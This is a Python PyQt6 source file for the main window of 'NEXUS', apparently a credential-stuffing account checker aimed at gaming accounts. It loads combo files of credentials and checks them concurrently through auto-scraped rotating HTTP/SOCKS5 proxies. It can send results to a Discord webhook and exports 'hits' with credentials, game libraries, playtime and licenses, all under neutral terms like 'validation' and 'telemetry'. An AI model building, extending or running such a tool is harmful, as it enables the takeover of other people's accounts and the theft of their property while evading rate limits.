"""
NEXUS v1.0.0 Primary Application Window
Streamlined 2-view architecture (Dashboard & Proxy Management) with instant non-blocking engine dispatch.
"""

import os
from pathlib import Path
from PyQt6.QtWidgets import (
    QMainWindow, QWidget, QHBoxLayout, QStackedWidget, QMessageBox, QFileDialog
)
from PyQt6.QtCore import Qt

from nexus.config import APP_NAME, APP_SUBTITLE, RESULTS_DIR
from nexus.core.engine import ValidationEngine
from nexus.utils.exporter import ResultExporter
from nexus.ui.styles import MAIN_STYLESHEET
from nexus.ui.components.sidebar import Sidebar
from nexus.ui.views.dashboard_view import DashboardView
from nexus.ui.views.proxy_view import ProxyView, RelayScraperThread


class NexusMainWindow(QMainWindow):
    """Main application window for the streamlined 2-view NEXUS suite."""

    def __init__(self):
        super().__init__()
        self.setWindowTitle(f"{APP_NAME} — {APP_SUBTITLE}")
        self.setMinimumSize(1180, 750)
        self.setStyleSheet(MAIN_STYLESHEET)

        self.engine_worker: ValidationEngine = None
        self.all_results = []
        self.exporter = ResultExporter(RESULTS_DIR)

        # Central Layout
        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        root_layout = QHBoxLayout(central_widget)
        root_layout.setContentsMargins(0, 0, 0, 0)
        root_layout.setSpacing(0)

        # 1. Fixed 2-Tab Sidebar
        self.sidebar = Sidebar()
        self.sidebar.tab_changed.connect(self._switch_view)
        root_layout.addWidget(self.sidebar)

        # 2. View Stack (0: Dashboard, 1: Proxy)
        self.stack = QStackedWidget()

        self.dashboard_view = DashboardView()
        self.proxy_view = ProxyView()

        self.stack.addWidget(self.dashboard_view)  # 0
        self.stack.addWidget(self.proxy_view)      # 1

        root_layout.addWidget(self.stack)

        from PyQt6.QtGui import QIcon
        from nexus.config import ICON_PATH
        if os.path.exists(ICON_PATH):
            self.setWindowIcon(QIcon(str(ICON_PATH)))

        # Wire Signals
        # Wire Signals
        self._wire_signals()

        # Update initial proxy mode display from loaded pool
        init_proxies = self.proxy_view.relay_pool.active_count
        self.dashboard_view.update_proxy_mode(init_proxies)

        # Auto-Scrape Fresh Proxies on Boot (Background Non-blocking)
        self._start_auto_background_scrape()

    def closeEvent(self, event):
        """Ensures proxy pool is permanently saved before closing so proxies are never lost."""
        if hasattr(self, "proxy_view"):
            self.proxy_view.save_pool_to_disk()
        if hasattr(self, "auto_scraper") and self.auto_scraper and self.auto_scraper.isRunning():
            self.auto_scraper.terminate()
            self.auto_scraper.wait(500)
        if self.engine_worker and self.engine_worker._is_running:
            self.engine_worker.stop()
        event.accept()

    def _start_auto_background_scrape(self):
        """Immediately starts background proxy scraping on application boot without blocking."""
        self.sidebar.set_status("Auto-Syncing Relays...")
        init_count = self.proxy_view.relay_pool.active_count
        if init_count > 0:
            self.dashboard_view.mode_badge.setText(f"🌐 Rotating Relay Pool ({init_count} Nodes) [Auto-Refreshing...]")
        else:
            self.dashboard_view.mode_badge.setText("🌐 Auto-Fetching Fresh Proxies...")
            self.dashboard_view.mode_badge.setStyleSheet("color: #ffab00; background-color: rgba(255, 171, 0, 0.12); border: 1px solid rgba(255, 171, 0, 0.3);")

        self.auto_scraper = RelayScraperThread(schemes=["http", "socks5"], test_proxies=True, parent=self)
        self.auto_scraper.scraping_completed.connect(self._on_auto_scrape_completed)
        self.auto_scraper.start()

    def _on_auto_scrape_completed(self, fresh_relays):
        # Merge with existing relays (preserve user custom proxies)
        existing_keys = {f"{r.host}:{r.port}" for r in self.proxy_view.relay_pool.relays}
        new_count = 0
        for fr in fresh_relays:
            k = f"{fr.host}:{fr.port}"
            if k not in existing_keys:
                self.proxy_view.relay_pool.relays.append(fr)
                existing_keys.add(k)
                new_count += 1

        self.proxy_view.save_pool_to_disk()
        self.proxy_view._populate_table()
        self._on_relays_updated(self.proxy_view.relay_pool)
        self.sidebar.set_status("Ready!")

    def _switch_view(self, index: int):
        self.stack.setCurrentIndex(index)

    def _wire_signals(self):
        # Dashboard Controls
        self.dashboard_view.start_requested.connect(self._start_engine)
        self.dashboard_view.pause_requested.connect(self._toggle_pause_engine)
        self.dashboard_view.stop_requested.connect(self._stop_engine)
        self.dashboard_view.export_requested.connect(self._export_results)
        self.dashboard_view.quick_scrape_requested.connect(self._handle_quick_scrape)

        # Proxy Updates
        self.proxy_view.relays_updated.connect(self._on_relays_updated)

    def _on_relays_updated(self, pool):
        count = pool.active_count
        self.dashboard_view.update_proxy_mode(count)

    def _handle_quick_scrape(self):
        """Fetches fresh proxies quickly without locking the engine."""
        self.sidebar.set_status("Scraping Proxies...")
        self.dashboard_view.quick_scrape_btn.setEnabled(False)
        self.dashboard_view.quick_scrape_btn.setText("⏳ Scraping Proxies...")

        self.quick_scraper = RelayScraperThread(schemes=["http", "socks5"], test_proxies=True, parent=self)
        self.quick_scraper.scraping_completed.connect(self._on_quick_scrape_completed)
        self.quick_scraper.start()

    def _on_quick_scrape_completed(self, fresh_relays):
        existing_keys = {f"{r.host}:{r.port}" for r in self.proxy_view.relay_pool.relays}
        new_count = 0
        for fr in fresh_relays:
            k = f"{fr.host}:{fr.port}"
            if k not in existing_keys:
                self.proxy_view.relay_pool.relays.append(fr)
                existing_keys.add(k)
                new_count += 1

        self.proxy_view.save_pool_to_disk()
        self.proxy_view._populate_table()
        self._on_relays_updated(self.proxy_view.relay_pool)
        self.sidebar.set_status("Ready!")
        self.dashboard_view.quick_scrape_btn.setEnabled(True)
        self.dashboard_view.quick_scrape_btn.setText("⚡ Auto-Fetch Fresh Proxies")
        QMessageBox.information(
            self,
            "Proxies Updated",
            f"Successfully verified {new_count} fresh operational proxies.\\nTotal Active Pool: {self.proxy_view.relay_pool.active_count} nodes."
        )

    def _start_engine(self):
        """Starts validation engine immediately without unnecessary pre-blocking."""
        settings = self.dashboard_view.get_settings()
        combo_file = settings["combo_file"]

        if not combo_file:
            QMessageBox.warning(self, "No File Selected", "Please select a valid credential batch (.txt) file.")
            return

        if not os.path.exists(combo_file):
            QMessageBox.warning(self, "File Not Found", f"The selected file does not exist:\n{combo_file}")
            return

        total_accounts = settings.get("total_count", 0)
        if total_accounts == 0:
            try:
                with open(combo_file, "rb") as bf:
                    total_accounts = sum(buf.count(b"\n") for buf in iter(lambda: bf.read(1024 * 1024), b""))
            except Exception:
                total_accounts = 0

        # Check proxy pool
        active_pool = self.proxy_view.relay_pool if self.proxy_view.relay_pool.active_count > 0 else None

        # Clear previous run data
        self.all_results.clear()
        self.dashboard_view.table.clear_results()

        # Instantiate ValidationEngine with Streaming Generator & Discord Webhook
        self.engine_worker = ValidationEngine(
            combos=combo_file,
            relay_pool=active_pool,
            concurrency=settings["concurrency"],
            timeout=settings["timeout"],
            max_retries=settings["retries"],
            exporter=self.exporter,
            total_count_override=total_accounts,
            webhook_url=settings.get("webhook_url", "")
        )

        self.engine_worker.item_checked.connect(self._handle_item_checked)
        self.engine_worker.stats_updated.connect(self.dashboard_view.update_metrics)
        self.engine_worker.status_changed.connect(self._handle_status_changed)
        self.engine_worker.engine_finished.connect(self._handle_engine_finished)

        self.dashboard_view.set_engine_state(running=True, paused=False)
        self.sidebar.set_status("Running...")
        self.engine_worker.start()

    def _toggle_pause_engine(self):
        if not self.engine_worker:
            return
        if self.engine_worker._is_paused:
            self.engine_worker.resume()
            self.dashboard_view.set_engine_state(running=True, paused=False)
        else:
            self.engine_worker.pause()
            self.dashboard_view.set_engine_state(running=True, paused=True)

    def _stop_engine(self):
        if self.engine_worker:
            self.engine_worker.stop()

    def _handle_item_checked(self, item: dict):
        self.all_results.append(item)
        self.dashboard_view.add_result(item)

    def _handle_status_changed(self, status: str):
        self.sidebar.set_status(status)

    def _handle_engine_finished(self):
        self.dashboard_view.set_engine_state(running=False, paused=False)
        self.sidebar.set_status("Completed")
        QMessageBox.information(
            self,
            "Execution Finalized",
            f"Batch processing completed.\nTotal Processed: {len(self.all_results)}\nHits: {self.dashboard_view.card_hits.value_label.text()}"
        )

    def _export_results(self):
        if not self.all_results:
            QMessageBox.information(self, "No Results", "There are no verified items to export.")
            return

        RESULTS_DIR.mkdir(parents=True, exist_ok=True)
        hits_file = RESULTS_DIR / "hits.txt"
        hits_detailed_file = RESULTS_DIR / "hits_detailed.txt"
        json_file = RESULTS_DIR / "results.json"
        csv_file = RESULTS_DIR / "summary.csv"

        self.exporter.export_hits_custom(self.all_results, hits_file)
        self.exporter.export_hits_detailed(self.all_results, hits_detailed_file)
        self.exporter.export_all_json(self.all_results, json_file)
        self.exporter.export_all_csv(self.all_results, csv_file)

        hit_count = sum(1 for it in self.all_results if it.get("status") in ("HIT", "2FA_HIT"))
        free_count = sum(1 for it in self.all_results if it.get("status") == "FREE")

        msg_box = QMessageBox(self)
        msg_box.setWindowTitle("Export Completed Successfully")
        msg_box.setIcon(QMessageBox.Icon.Information)
        msg_box.setText(
            f"<b>Telemetry Export Complete!</b><br><br>"
            f"• <b>Hits Exported:</b> {hit_count} accounts with full game lists<br>"
            f"• <b>Free Tier Accounts:</b> {free_count}<br>"
            f"• <b>Total Processed:</b> {len(self.all_results)}<br><br>"
            f"<b>Files Generated in <code>{RESULTS_DIR}</code>:</b><br>"
            f"1. <code>hits.txt</code> (Single-line credentials + total games + all games written out)<br>"
            f"2. <code>hits_detailed.txt</code> (Full account dossiers with playtime & licenses)<br>"
            f"3. <code>summary.csv</code> (Tabular spreadsheet with games_list)<br>"
            f"4. <code>results.json</code> (Complete structured dataset)"
        )
        open_folder_btn = msg_box.addButton("📂 Open Results Folder", QMessageBox.ButtonRole.ActionRole)
        close_btn = msg_box.addButton("OK", QMessageBox.ButtonRole.AcceptRole)
        msg_box.setDefaultButton(close_btn)
        msg_box.exec()

        if msg_box.clickedButton() == open_folder_btn:
            try:
                os.startfile(str(RESULTS_DIR))
            except Exception:
                import subprocess
                subprocess.Popen(["explorer", str(RESULTS_DIR)])
